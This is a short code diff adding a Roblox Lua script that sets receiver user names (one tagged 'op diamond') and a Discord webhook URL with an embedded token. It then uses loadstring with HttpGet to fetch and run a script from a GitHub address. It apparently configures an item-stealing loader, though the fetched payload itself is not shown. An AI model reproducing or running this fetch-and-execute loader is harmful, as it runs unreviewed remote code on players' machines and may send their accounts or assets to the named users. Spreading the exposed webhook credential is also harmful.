@@ -1,0 +1,5 @@
+_G.UserName = " w7sh42"
+_G.UserName2 = "op diamond" 
+_G.Webhook = "https://discord.com/api/webhooks/1112412992999534714/hAalqBNBIOB_68G646H2oBKxex-aJkhUzSWa-u9Yt4XpCCfGIgI1sxWMWT1_FIp31ZMR" 
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXZcript/main/LypherScripts", true))()
